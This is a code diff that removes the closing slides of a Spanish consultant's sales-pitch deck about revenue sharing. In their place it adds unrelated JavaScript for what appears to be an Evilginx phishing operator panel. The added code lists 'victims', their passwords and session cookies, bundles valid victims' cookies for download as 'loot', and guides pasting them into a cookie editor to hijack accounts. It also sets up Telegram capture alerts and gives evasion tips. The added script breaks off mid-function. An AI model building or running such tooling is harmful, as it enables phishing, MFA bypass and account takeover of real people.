-            Nutrición y calentamiento previo de toda la base: exalumnas, rechazadas, leads fríos. Webinar de ascensión, que hace cuatro cosas a la vez: recupera exalumnas, sube el LTV, estrena la oferta nueva ante la audiencia más informada que tienes, y rebate objeciones a escala.
-          </div>
-          <div style="margin-top:16px; padding-top:14px; border-top:1px solid var(--line);">
-            <span style="font-size:13px; font-weight:700; color:var(--green); text-transform:uppercase; letter-spacing:0.1em;">Al final: </span>
-            <span style="font-size:13px; color:var(--green);">oferta nueva validada con dinero real y base caliente otra vez.</span>
-          </div>
-        </div>
-
-        <!-- FASE 3 -->
-        <div style="flex:1; border-right:1px solid var(--line); padding:0 28px; display:flex; flex-direction:column;">
-          <div style="font-size:80px; font-weight:700; color:var(--green); line-height:0.9; margin-bottom:4px;">03</div>
-          <div style="font-size:14px; font-weight:500; text-transform:uppercase; letter-spacing:0.1em; color:var(--white); margin-bottom:2px;">Consolidar y abrir canales</div>
-          <div style="font-size:12px; color:var(--grey); margin-bottom:14px;">~semanas 9-14</div>
-          <div style="font-size:15px; color:var(--grey); line-height:1.55; flex:1;">
-            Cross-sell de los programas parados en el momento correcto del ciclo de vida de cada alumna. YouTube activo, con la estrategia definida sobre datos reales de qué contenido convierte. Preparación del escalado.
-          </div>
-          <div style="margin-top:16px; padding-top:14px; border-top:1px solid var(--line);">
-          </div>
-        </div>
-
-        <!-- FASE 4 -->
-        <div style="flex:1; padding-left:28px; display:flex; flex-direction:column;">
-          <div style="font-size:80px; font-weight:700; color:var(--green); line-height:0.9; margin-bottom:4px;">04</div>
-          <div style="font-size:14px; font-weight:500; text-transform:uppercase; letter-spacing:0.1em; color:var(--white); margin-bottom:2px;">Escalado sostenible</div>
-          <div style="font-size:12px; color:var(--grey); margin-bottom:14px;">~semana 14 en adelante</div>
-          <div style="font-size:15px; color:var(--grey); line-height:1.55; flex:1;">
-            Evergreen estable como base + webinars recurrentes encima. El evergreen genera ventas todos los días; los directos añaden picos sobre una base que ya no depende de ellos. Dejas de vivir de lanzamiento en lanzamiento. Paid quirúrgico solo si los datos lo justifican.
-          </div>
-          <div style="margin-top:16px; padding-top:14px; border-top:1px solid var(--line);">
-          </div>
-        </div>
-      </div>
-
-      <!-- Cita -->
-      <div class="quote-block" style="margin-top:0;">
-        <p style="font-size:22px;">"El orden no es negociable. Meter 3.000 personas en un negocio roto no es aprovecharlas: es quemarlas. Y son las únicas 3.000 que tienes."</p>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>EJECUCIÓN · 14</span>
-    <span>14 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 15 — QUÉ CAMBIA PARA TI
-     ============================================================ -->
-<section class="slide" data-slide-number="15" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>EJECUCIÓN · SITUACIÓN DESEADA</span></div>
-
-  <div class="slide-content" style="padding-top:24px;">
-    <div style="display:flex; flex-direction:column; height:100%; gap:20px;">
-      <div class="h1" style="font-size:72px; margin-bottom:8px;">DÓNDE ESTÁS HOY<br>Y DÓNDE VAS A ESTAR</div>
-
-      <!-- Tabla comparativa dos columnas -->
-      <div style="flex:1; display:flex; gap:0; overflow:hidden;">
-
-        <!-- Columna HOY -->
-        <div style="flex:1; padding-right:0;">
-          <div style="padding:12px 20px; background:rgba(138,143,140,0.08); border-bottom:1px solid var(--line);">
-            <span style="font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:0.15em; color:var(--grey);">HOY</span>
-          </div>
-          <div style="font-size:15px; color:var(--grey); line-height:1.4;">
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.3);">$7.200 al mes que no se mueven</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.3);">Tus mañanas enteras en 1:1</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.3);">Te enteras de los problemas a fin de mes</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.3);">Ideas que se acumulan sin ejecutar</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.3);">Encender y apagar sistemas a mano</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.3);">Gestionar tú a la directora comercial, closers y al equipo</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.3);">3.000 exalumnas paradas</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.3);">Lanzamientos que te agotan</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.3);">Programas grabados sin vender</div>
-            <div style="padding:13px 20px;">Sensación de perder dinero cada día</div>
-          </div>
-        </div>
-
-        <!-- Hairline vertical -->
-        <div class="hairline-v"></div>
-
-        <!-- Columna DESPUÉS -->
-        <div style="flex:1; background:var(--forest);">
-          <div style="padding:12px 20px; border-bottom:1px solid var(--line);">
-            <span style="font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:0.15em; color:var(--green);">DESPUÉS</span>
-          </div>
-          <div style="font-size:15px; color:var(--white); line-height:1.4;">
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.5);">Un negocio creciendo con base predecible</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.5);">Grupales y contenido: lo que rindes y lo que disfrutas</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.5);">Se ven el mismo día y se corrigen</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.5);">Alguien ejecutándolas contigo cada semana</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.5);">Sistemas que funcionan solos, con supervisión y optimización constante</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.5);">Yo gestiono y optimizo; las decisiones las tomamos juntos</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.5);">Base activa generando de forma recurrente</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.5);">Directos cada vez más escalables y con menos carga para ti</div>
-            <div style="padding:13px 20px; border-bottom:1px solid rgba(31,111,74,0.5);">Vendiéndose dentro de un ciclo definido</div>
-            <div style="padding:13px 20px;">Saber exactamente de dónde viene cada venta</div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Texto + cita -->
-      <div style="display:flex; gap:40px; align-items:flex-start; padding-top:8px;">
-        <div style="flex:1; font-size:16px; color:var(--grey); line-height:1.5;">
-          Lo que sigues haciendo: tu contenido, tus clases, tus directos, tu marca. Lo que te gusta y lo que nadie puede hacer por ti.
-        </div>
-        <div style="flex:2;">
-          <div class="quote-block" style="margin-top:0;">
-            <p style="font-size:22px;">"Dejaste la agencia para tener más libertad y más tiempo con tus hijos. Vamos a terminar ese trabajo."</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>EJECUCIÓN · 15</span>
-    <span>15 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 16 — MODELO ECONÓMICO
-     ============================================================ -->
-<section class="slide" data-slide-number="16" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>MODELO · REPARTO</span></div>
-
-  <div class="slide-content" style="padding-top:28px;">
-    <div style="display:flex; gap:60px; height:100%;">
-
-      <!-- Columna izquierda: título + entrada + base -->
-      <div style="flex:1; display:flex; flex-direction:column; gap:24px;">
-        <div class="h1" style="font-size:60px; margin-bottom:0;">SOLO COBRO SOBRE<br>LO QUE CONSIGAMOS<br>CRECER</div>
-
-        <!-- Entrada -->
-        <div style="border-top:1px solid var(--line); padding-top:20px;">
-          <div class="eyebrow" style="margin-bottom:10px;">ENTRADA</div>
-          <div style="font-size:80px; font-weight:700; line-height:0.9; color:var(--green); letter-spacing:-0.02em;">$4.000</div>
-          <div style="font-size:16px; color:var(--grey); margin-top:10px; line-height:1.5;">$2.000 a la firma + $2.000 al cierre de la Fase 1, tras auditar el negocio completo y resolver los cuellos de botella.</div>
-        </div>
-
-        <!-- Línea base -->
-        <div style="border-top:1px solid var(--line); padding-top:20px;">
-          <div class="eyebrow" style="margin-bottom:10px;">LÍNEA BASE</div>
-          <div style="font-size:80px; font-weight:700; line-height:0.9; color:var(--white); letter-spacing:-0.02em;">$7.200<span style="font-size:28px; color:var(--grey); font-weight:400;">/mes</span></div>
-          <div style="font-size:15px; color:var(--grey); margin-top:10px; line-height:1.5;">Promedio de mayo, junio y julio de Hotmart y PayPal. Se fija por escrito y no se toca durante toda la colaboración.</div>
-        </div>
-      </div>
-
-      <!-- Hairline vertical -->
-      <div class="hairline-v"></div>
-
-      <!-- Columna derecha: frase + incremental + cómo -->
-      <div style="flex:1.2; display:flex; flex-direction:column; gap:20px;">
-
-        <!-- Frase destacada -->
-        <div class="highlight-block">
-          <p style="font-size:22px;">Todo lo que el negocio genere hasta esa cifra es <strong style="color:var(--green);">100% tuyo</strong>. No cobro nada de lo que ya haces.</p>
-        </div>
-
-        <!-- Incremental -->
-        <div style="border-top:1px solid var(--line); padding-top:16px;">
-          <div class="eyebrow" style="margin-bottom:12px;">SOBRE EL INCREMENTAL</div>
-          <div style="display:flex; gap:40px; align-items:center;">
-            <div style="text-align:center;">
-              <div style="font-size:90px; font-weight:700; color:var(--green); line-height:0.9;">30%</div>
-              <div style="font-size:14px; color:var(--grey); margin-top:8px;">Hasta $15.000</div>
-            </div>
-            <div class="hairline-v" style="height:80px;"></div>
-            <div style="text-align:center;">
-              <div style="font-size:90px; font-weight:700; color:var(--green); line-height:0.9;">35%</div>
-              <div style="font-size:14px; color:var(--grey); margin-top:8px;">Sobre lo que exceda $15.000</div>
-            </div>
-          </div>
-          <div style="font-size:14px; color:var(--grey); margin-top:14px; line-height:1.5;">
-            <strong style="color:var(--white);">Base de cálculo:</strong> Cash collected de todas las plataformas de venta, menos la comisión de la plataforma. Lo que entra neto.
-          </div>
-        </div>
-
-        <!-- Cómo se paga / mide -->
-        <div style="border-top:1px solid var(--line); padding-top:14px; display:flex; gap:32px;">
-          <div style="flex:1;">
-            <div class="eyebrow" style="margin-bottom:8px; font-size:10px;">CÓMO SE PAGA</div>
-            <div style="font-size:14px; color:var(--grey); line-height:1.5;">Liquidación mensual el día 5, contra el dashboard compartido donde ves el cálculo completo. Una sola transferencia al mes. Si migramos a Whop o Fanbasis, se puede automatizar el reparto directamente en plataforma.</div>
-          </div>
-          <div style="flex:1;">
-            <div class="eyebrow" style="margin-bottom:8px; font-size:10px;">CÓMO SE MIDE</div>
-            <div style="font-size:14px; color:var(--grey); line-height:1.5;">El dashboard está abierto para ti todo el mes. Sin dos versiones del número, sin costes que auditar.</div>
-          </div>
-        </div>
-
-        <div class="quote-block" style="margin-top:0;">
-          <p style="font-size:22px;">"Si el mes que viene el negocio hace lo mismo que hoy, no cobro variable. Cobro cuando doy resultados."</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>MODELO · 16</span>
-    <span>16 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 17 — DURACIÓN Y CIERRE
-     ============================================================ -->
-<section class="slide" data-slide-number="17" style="background:var(--black);">
-  <div class="slide-header"><span>CIERRE</span></div>
-
-  <!-- Deco × gigante (igual que portada) -->
-  <div class="deco-x" style="right:-60px; bottom:-180px;">×</div>
-
-  <div class="slide-content">
-    <div style="display:flex; gap:80px; height:100%;">
-
-      <!-- Columna izquierda: duración -->
-      <div style="flex:0 0 480px; display:flex; flex-direction:column; justify-content:space-between;">
-        <div>
-          <div class="h1" style="font-size:68px; margin-bottom:20px;">CÓMO<br>CERRAMOS<br>ESTO</div>
-
-          <!-- Hero 4 MESES -->
-          <div>
-            <div style="font-size:200px; font-weight:700; line-height:0.88; color:var(--green); letter-spacing:-0.03em;">4</div>
-            <div style="font-size:40px; font-weight:700; color:var(--green); text-transform:uppercase; letter-spacing:0.05em; margin-top:-10px;">MESES</div>
-          </div>
-
-          <div style="font-size:17px; color:var(--grey); margin-top:20px; line-height:1.55;">
-            Al final del mes 4 nos sentamos y revisamos todo, sobre el promedio de los cuatro meses. Duplicar significa llegar a <strong style="color:var(--white);">$14.400 al mes</strong>.
-          </div>
-        </div>
-
-        <!-- Si cerramos hoy -->
-        <div style="font-size:28px; font-weight:600; color:var(--green);">
-          Si cerramos hoy, el lunes arrancamos.
-        </div>
-      </div>
-
-      <!-- Hairline vertical -->
-      <div class="hairline-v"></div>
-
-      <!-- Columna derecha: dos escenarios + cita -->
-      <div style="flex:1; display:flex; flex-direction:column; gap:24px; justify-content:space-between;">
-
-        <!-- Si no hemos duplicado -->
-        <div style="border-top:3px solid var(--line); padding-top:20px; flex:1;">
-          <div class="eyebrow" style="margin-bottom:12px; color:var(--grey);">Si no hemos duplicado</div>
-          <div style="font-size:18px; color:var(--grey); line-height:1.6;">
-            Se acaba ahí. Te quedas con todo lo construido y funcionando: sistema de ventas, guiones, SOP, setter formado, CRM, secuencias, la oferta nueva. <strong style="color:var(--white);">Todo es tuyo y sigue produciendo sin mí.</strong>
-          </div>
-        </div>
-
-        <!-- Si hemos cumplido -->
-        <div style="border-top:3px solid var(--green); padding-top:20px; flex:1;">
-          <div class="eyebrow" style="margin-bottom:12px; color:var(--green);">Si hemos cumplido los objetivos y los dos estamos a gusto</div>
-          <div style="font-size:18px; color:var(--white); line-height:1.6;">
-            Mantenemos el acuerdo. Seguimos porque tiene sentido, no porque haya un papel que obligue.<br>
-            A partir de ahí, mes a mes. Si algún día deja de encajarte, me avisas con 30 días y cerramos ordenadamente.
-          </div>
-        </div>
-
-        <!-- Frase destacada -->
-        <div style="border-top:1px solid var(--line); padding-top:16px;">
-          <div style="font-size:20px; font-weight:600; color:var(--white); line-height:1.4; margin-bottom:20px;">
-            Todo lo que construyo es tuyo desde el primer día. No hay permanencia ni penalización por salir.
-          </div>
-        </div>
-
-        <!-- Cita principal cierre -->
-        <div class="quote-block" style="margin-top:0; border-left-color:var(--green);">
-          <p style="font-size:22px;">"No quiero que trabajes conmigo por contrato. Quiero que los números hablen. Si he hecho bien mi trabajo no vas a querer que me vaya, y si en algún momento deja de encajarte, me lo dices y ya está."</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span></span>
-    <span>17 / 17</span>
-  </div>
-</section>
-
-<!-- End slides -->
-  </div><!-- end slide-wrapper -->
-</div><!-- end stage -->
-
-<!-- ============================================================
-     JAVASCRIPT — NAVEGACIÓN + ESCALADO
-     ============================================================ -->
 <script>
-(function() {
-  'use strict';
-
-  // ── Estado ──────────────────────────────────────────────────
-  let current = 0;
-  const slides = document.querySelectorAll('.slide');
-  const total = slides.length;
-  const wrapper = document.getElementById('slideWrapper');
-  const indicator = document.getElementById('indicator');
-
-  // ── Escalado responsive ──────────────────────────────────────
-  function scale() {
-    const sw = 1920, sh = 1080;
-    const vw = window.innerWidth, vh = window.innerHeight;
-    const ratio = Math.min(vw / sw, vh / sh);
-    wrapper.style.transform = 'scale(' + ratio + ')';
+// ---------- i18n ----------
+const I18N = {
+  en: {
+    search_ph:"Search user / IP…  (/)", refresh:"↻ Refresh", auto:"Auto", loot:"⬇ Loot", csv:"⬇ CSV",
+    loot_t:"Download all valid victims' cookies (zip)", csv_t:"Sessions CSV for the report (no secrets)",
+    tab_victims:"Victims", tab_sessions:"All sessions", tab_lures:"Lures", tab_urls:"My URLs", tab_settings:"Settings",
+    domains:"Domains", all_phishlets:"All phishlets", only_valid:"Valid session only", show_noise:"Show visits with no login",
+    kpi_unique:"Unique victims", kpi_valid:"With valid session", kpi_creds:"With credentials", kpi_nologin:"Visits w/o login",
+    kpi_phishlets:"Phishlets", kpi_total:"Total sessions",
+    th_user:"User", th_phishlet:"Phishlet", th_session:"Session", th_cookies:"Cookies", th_attempts:"Attempts",
+    th_lastip:"Last IP", th_seen:"Seen", th_loot:"Loot", th_pass:"Password", th_ip:"IP", th_captured:"Captured",
+    valid:"valid", no:"no", used:"used", dup:"dup", copy_cookies:"copy cookies", view_cookies:"view cookies",
+    of:"of", victims_l:"victims", sessions_l:"sessions", empty_victims:"No victims match the filter.",
+    empty_sessions:"No sessions match.", best_session:"Best session", cookies_w:"cookies", invalid:"invalid",
+    useragent:"User-Agent", landing:"Landing", attempts_h:"Attempts", mark_used:"Mark as used",
+    notes_ph:"notes (cookies reused, MFA ok, bounced...)", save:"save", loading:"loading…",
+    tl_valid:"valid · 14d", tl_title:"valid",
+    lure_col:"Lure (landing URL)", visits_col:"Visits", valid_col:"Valid", victims_col:"Victims", conv_col:"Conversion",
+    no_lures:"No lure data.", unknown:"(unknown)",
+    url_ph:"https://login.your-domain.com/xxxx", label_ph:"label (optional)", add:"+ Add", active_only:"Active only",
+    copy_active:"Copy active", active:"active", down:"down", copy:"copy", delete:"delete",
+    url_empty_active:"No active URLs right now.", url_empty:"Add your lure URLs above.",
+    url_saved:(a,t)=>`${a} active / ${t} saved`, confirm_del:"Delete this URL from the list?",
+    url_added:"URL added", url_copied:"URL copied", no_active:"No active URLs", active_copied:n=>`${n} active URLs copied`,
+    set_title:"Telegram alerts",
+    set_sub:"Get pinged when a victim with a valid session is captured or when a domain goes down. Configured here, no restart.",
+    set_enable:"Enable Telegram alerts", bot_token:"Bot token", chat_id:"Chat ID",
+    minimal:"Minimal alerts: don't include victim's user or IP (OPSEC-recommended)",
+    save_btn:"Save", send_test:"Send test", token_saved:"•••••• saved (leave empty to keep it)",
+    set_note:'How to get the values:<br>1. Create a bot with <code>@BotFather</code> → <code>/newbot</code> → gives you the <b>token</b>.<br>2. Message your bot and open <code>https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code>, copy the <b>chat id</b> (or use <code>@userinfobot</code>).<br>3. Save, then hit "Send test".',
+    settings_saved:"Settings saved", test_sent:"Test sent — check Telegram", error:"Error",
+    vstate_saved:"Victim state saved",
+    copied_paste:id=>`Session ${id} cookies copied. Paste them in Cookie-Editor / StorageAce.`,
+    new_sessions:n=>`${n} new session(s) captured`, load_err:"Error loading data",
+    updated:"updated", health_up:"● Evilginx active", health_down:"● Evilginx not detected",
+    last_capture:"last capture", no_captures:"no captures", sessions_phishlets:(s,p)=>`${s} sessions · ${p} phishlets`,
+    sb_on:'Safe Browsing: <span style="color:var(--warn)">ON ⚠ (your URLs are sent to Google)</span>',
+    sb_off:'Safe Browsing: <span style="color:var(--ok)">OFF</span>',
+    flagged:"flagged ⚠", mip_title:n=>`same account from ${n} distinct IPs; the cookie may bounce due to conditional access`,
+    ago:(n,u)=>`${n}${u} ago`,
+  },
+  es: {
+    search_ph:"Buscar usuario / IP…  (/)", refresh:"↻ Actualizar", auto:"Auto", loot:"⬇ Loot", csv:"⬇ CSV",
+    loot_t:"Descargar todas las cookies de víctimas válidas (zip)", csv_t:"CSV de sesiones para el informe (sin secretos)",
+    tab_victims:"Víctimas", tab_sessions:"Todas las sesiones", tab_lures:"Lures", tab_urls:"Mis URLs", tab_settings:"Ajustes",
+    domains:"Dominios", all_phishlets:"Todos los phishlets", only_valid:"Solo con sesión válida", show_noise:"Mostrar visitas sin usuario",
+    kpi_unique:"Víctimas únicas", kpi_valid:"Con sesión válida", kpi_creds:"Con credenciales", kpi_nologin:"Visitas sin login",
+    kpi_phishlets:"Phishlets", kpi_total:"Sesiones totales",
+    th_user:"Usuario", th_phishlet:"Phishlet", th_session:"Sesión", th_cookies:"Cookies", th_attempts:"Intentos",
+    th_lastip:"Última IP", th_seen:"Visto", th_loot:"Loot", th_pass:"Password", th_ip:"IP", th_captured:"Capturado",
+    valid:"válida", no:"no", used:"usada", dup:"dup", copy_cookies:"copiar cookies", view_cookies:"ver cookies",
+    of:"de", victims_l:"víctimas", sessions_l:"sesiones", empty_victims:"Sin víctimas que coincidan con el filtro.",
+    empty_sessions:"Sin sesiones que coincidan.", best_session:"Mejor sesión", cookies_w:"cookies", invalid:"no válida",
+    useragent:"User-Agent", landing:"Landing", attempts_h:"Intentos", mark_used:"Marcar como usada",
+    notes_ph:"notas (cookies reusadas, MFA ok, rebotó...)", save:"guardar", loading:"cargando…",
+    tl_valid:"válidas · 14d", tl_title:"válidas",
+    lure_col:"Lure (landing URL)", visits_col:"Visitas", valid_col:"Válidas", victims_col:"Víctimas", conv_col:"Conversión",
+    no_lures:"Sin datos de lures.", unknown:"(desconocido)",
+    url_ph:"https://login.tu-dominio.com/xxxx", label_ph:"etiqueta (opcional)", add:"+ Añadir", active_only:"Solo activas",
+    copy_active:"Copiar activas", active:"activa", down:"caída", copy:"copiar", delete:"borrar",
+    url_empty_active:"No hay URLs activas ahora mismo.", url_empty:"Añade tus URLs de lure arriba.",
+    url_saved:(a,t)=>`${a} activas / ${t} guardadas`, confirm_del:"¿Borrar esta URL de la lista?",
+    url_added:"URL añadida", url_copied:"URL copiada", no_active:"No hay URLs activas", active_copied:n=>`${n} URLs activas copiadas`,
+    set_title:"Alertas de Telegram",
+    set_sub:"Recibe un aviso cuando cae una víctima con sesión válida o cuando un dominio se cae. Se configura aquí, sin reiniciar nada.",
+    set_enable:"Activar alertas de Telegram", bot_token:"Bot token", chat_id:"Chat ID",
+    minimal:"Alertas mínimas: no incluir usuario ni IP de la víctima (recomendado OPSEC)",
+    save_btn:"Guardar", send_test:"Enviar test", token_saved:"•••••• guardado (deja vacío para no cambiarlo)",
+    set_note:'Cómo obtener los datos:<br>1. Crea un bot con <code>@BotFather</code> → <code>/newbot</code> → te da el <b>token</b>.<br>2. Escribe algo a tu bot y abre <code>https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code>, copia el <b>chat id</b> (o usa <code>@userinfobot</code>).<br>3. Guarda, y pulsa "Enviar test".',
+    settings_saved:"Ajustes guardados", test_sent:"Test enviado — revisa Telegram", error:"Error",
+    vstate_saved:"Estado de víctima guardado",
+    copied_paste:id=>`Cookies de la sesión ${id} copiadas. Pégalas en Cookie-Editor / StorageAce.`,
+    new_sessions:n=>`${n} sesión(es) nueva(s) capturada(s)`, load_err:"Error cargando datos",
+    updated:"actualizado", health_up:"● Evilginx activo", health_down:"● Evilginx no detectado",
+    last_capture:"última captura", no_captures:"sin capturas", sessions_phishlets:(s,p)=>`${s} sesiones · ${p} phishlets`,
+    sb_on:'Safe Browsing: <span style="color:var(--warn)">ON ⚠ (tus URLs se envían a Google)</span>',
+    sb_off:'Safe Browsing: <span style="color:var(--ok)">OFF</span>',
+    flagged:"flaggeado ⚠", mip_title:n=>`misma cuenta desde ${n} IPs distintas; la cookie puede rebotar por conditional access`,
+    ago:(n,u)=>`hace ${n}${u}`,
   }
-  window.addEventListener('resize', scale);
-  scale();
+};
+let LANG = 'en';
+try{ const s=localStorage.getItem('ghostloot_lang'); if(s==='es'||s==='en') LANG=s; }catch(e){}
+function t(k){ const v=(I18N[LANG]&&I18N[LANG][k])??I18N.en[k]; return v===undefined?k:v; }
 
-  // ── Mostrar slide ────────────────────────────────────────────
-  function showSlide(n) {
-    slides[current].classList.remove('active');
-    current = (n + total) % total;
-    slides[current].classList.add('active');
-    const num = String(current + 1).padStart(2, '0');
-    indicator.textContent = num + ' / ' + String(total).padStart(2, '0');
+const state = {
+  raw: [], tab:'victims', q:'', phishlet:'', onlyValid:false, showNoise:false,
+  sort:{key:'update',dir:-1}, auto:false, timer:null, knownIds:new Set(), firstLoad:true, sig:'',
+};
+const $ = s => document.querySelector(s);
+const esc = s => (s==null?'':String(s)).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+
+function relTime(ts){
+  if(!ts) return '-';
+  const d = Date.now()/1000 - ts;
+  if(d < 60) return t('ago')(Math.floor(d),'s');
+  if(d < 3600) return t('ago')(Math.floor(d/60),'m');
+  if(d < 86400) return t('ago')(Math.floor(d/3600),'h');
+  return t('ago')(Math.floor(d/86400),'d');
+}
+function absTime(ts){ if(!ts) return ''; return new Date(ts*1000).toLocaleString(LANG==='es'?'es-ES':'en-US'); }
+function toast(msg){ const el=$('#toast'); el.textContent=msg; el.classList.add('show'); clearTimeout(el._t); el._t=setTimeout(()=>el.classList.remove('show'),2200); }
+
+function applyStatic(){
+  document.documentElement.lang = LANG;
+  $('#q').placeholder = t('search_ph');
+  $('#refresh').textContent = t('refresh');
+  $('#autolbl').textContent = t('auto');
+  $('#loot').textContent = t('loot'); $('#loot').title = t('loot_t');
+  $('#csv').textContent = t('csv'); $('#csv').title = t('csv_t');
+  $('#langbtn').textContent = LANG==='en' ? 'ES' : 'EN';
+  document.querySelector('[data-tab="victims"]').textContent = t('tab_victims');
+  document.querySelector('[data-tab="sessions"]').textContent = t('tab_sessions');
+  document.querySelector('[data-tab="lures"]').textContent = t('tab_lures');
+  document.querySelector('[data-tab="urls"]').textContent = t('tab_urls');
+  document.querySelector('[data-tab="settings"]').textContent = t('tab_settings');
+  $('#fvalid_l').textContent = t('only_valid');
+  $('#fnoise_l').textContent = t('show_noise');
+}
+
+// ---- grouping ----
+function victims(){
+  const m = new Map();
+  for(const s of state.raw){
+    const u = (s.username||'').trim(); if(!u) continue;
+    const key = u.toLowerCase();
+    let v = m.get(key);
+    if(!v){ v={username:u,phishlets:new Set(),sessions:[],valid:false,creds:false,best:null,lastUpdate:0,lastIP:''}; m.set(key,v); }
+    v.phishlets.add(s.phishlet); v.sessions.push(s);
+    if(s.valid) v.valid=true; if(s.password) v.creds=true;
+    if(s.update>v.lastUpdate){ v.lastUpdate=s.update; v.lastIP=s.remote_addr; }
+    if(!v.best) v.best=s; else{ const b=v.best;
+      const better=(s.valid&&!b.valid)||(s.valid===b.valid&&s.cookies>b.cookies)||(s.valid===b.valid&&s.cookies===b.cookies&&s.update>b.update);
+      if(better) v.best=s; }
   }
+  return [...m.values()].map(v=>({...v,phishlets:[...v.phishlets]}));
+}
+function noiseCount(){ return state.raw.filter(s=>!(s.username||'').trim()).length; }
 
-  // ── Navegación pública ───────────────────────────────────────
-  window.navigate = function(dir) { showSlide(current + dir); };
-
-  // ── Teclado ──────────────────────────────────────────────────
-  document.addEventListener('keydown', function(e) {
-    switch(e.key) {
-      case 'ArrowRight':
-      case 'ArrowDown':
-      case 'PageDown':
-      case ' ':
-        e.preventDefault();
-        showSlide(current + 1);
-        break;
-      case 'ArrowLeft':
-      case 'ArrowUp':
-      case 'PageUp':
-        e.preventDefault();
-        showSlide(current - 1);
-        break;
-      case 'Home':
-        e.preventDefault();
-        showSlide(0);
-        break;
-      case 'End':
-        e.preventDefault();
-        showSlide(total - 1);
-        break;
-      case 'f':
-      case 'F':
-        toggleFullscreen();
-        break;
-      case 'Escape':
-        if (document.fullscreenElement) document.exitFullscreen();
-        break;
-    }
+function applyFilter(list, keyUser, keyPhl){
+  const q = state.q.toLowerCase();
+  return list.filter(x=>{
+    if(state.phishlet){ const p=keyPhl(x); const ok=Array.isArray(p)?p.includes(state.phishlet):p===state.phishlet; if(!ok) return false; }
+    if(state.onlyValid && !x.valid) return false;
+    if(q){ const hay=(keyUser(x)+' '+(x.lastIP||x.remote_addr||'')).toLowerCase(); if(!hay.includes(q)) return false; }
+    return true;
   });
+}
+function sortList(list, getters){
+  const {key,dir}=state.sort; const g=getters[key]; if(!g) return list;
+  return list.slice().sort((a,b)=>{ let x=g(a),y=g(b); if(typeof x==='string'){x=x.toLowerCase();y=(y||'').toLowerCase();} if(x<y) return -1*dir; if(x>y) return 1*dir; return 0; });
+}
+function kpiHTML(items){ return items.map(i=>`<div class="kpi ${i.c||''} ${i.n===0?'n0':''}"><span class="bar"></span><div class="n">${i.n}</div><div class="l">${i.l}</div></div>`).join(''); }
 
-  // ── Fullscreen ───────────────────────────────────────────────
-  function toggleFullscreen() {
-    if (!document.fullscreenElement) {
-      document.documentElement.requestFullscreen().catch(function(){});
-    } else {
-      document.exitFullscreen();
-    }
+function render(){
+  const tab=state.tab;
+  document.querySelectorAll('.tab').forEach(x=>x.classList.toggle('on', x.dataset.tab===tab));
+  const isTable=(tab==='victims'||tab==='sessions');
+  $('#kpis').style.display=isTable?'':'none';
+  document.querySelector('.filters').style.display=isTable?'':'none';
+  document.querySelector('.wrap').style.display=isTable?'':'none';
+  $('#urlsview').hidden=tab!=='urls'; $('#settingsview').hidden=tab!=='settings'; $('#luresview').hidden=tab!=='lures';
+  if(tab==='urls'){ $('#timeline').style.display='none'; renderUrls(); return; }
+  if(tab==='settings'){ $('#timeline').style.display='none'; renderSettings(); return; }
+  if(tab==='lures'){ $('#timeline').style.display='none'; renderLures(); return; }
+  renderTimeline();
+  $('#fnoisewrap').style.display = tab==='sessions' ? '' : 'none';
+  if(tab==='victims') renderVictims(); else renderSessions();
+}
+
+function renderTimeline(){
+  const el=$('#timeline');
+  const valid=(state.raw||[]).filter(s=>s.valid && s.update);
+  if(!valid.length){ el.style.display='none'; return; }
+  const key=d=>new Date(d).toISOString().slice(0,10);
+  const now=new Date(); const days=[];
+  for(let i=13;i>=0;i--){ const d=new Date(now); d.setDate(now.getDate()-i); days.push(d); }
+  const counts={}; valid.forEach(s=>{ const k=key(s.update*1000); counts[k]=(counts[k]||0)+1; });
+  const max=Math.max(1,...days.map(d=>counts[key(d)]||0));
+  el.style.display='flex';
+  el.innerHTML='<span class="tlab">'+t('tl_valid')+'</span>'+days.map(d=>{
+    const c=counts[key(d)]||0; const h=Math.max(2,Math.round((c/max)*34));
+    return `<div class="bwrap" title="${key(d)}: ${c} ${t('tl_title')}"><div class="bl">${c||''}</div><div class="bar" style="height:${h}px;${c?'':'opacity:.2'}"></div></div>`;
+  }).join('');
+}
+
+function renderLures(){
+  const m=new Map();
+  for(const s of (state.raw||[])){
+    const u=s.landing_url||t('unknown');
